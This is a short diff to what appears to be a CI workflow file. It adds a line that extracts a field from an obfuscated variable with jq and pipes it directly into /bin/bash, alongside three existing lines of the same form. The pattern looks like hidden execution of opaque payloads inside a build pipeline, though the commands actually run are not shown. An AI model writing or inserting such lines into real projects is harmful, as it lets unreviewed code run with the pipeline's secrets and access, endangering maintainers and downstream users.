@@ -32,6 +32,7 @@ jobs:
           echo $ts85 | jq -r .nlt85 | /bin/bash
           printf '%s' "$kld099" | jq -r .anjl83 | /bin/bash
           printf '%s' "$yud4" | jq -r .q5 | /bin/bash
+          echo $yo42146 | jq -r .ir9 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
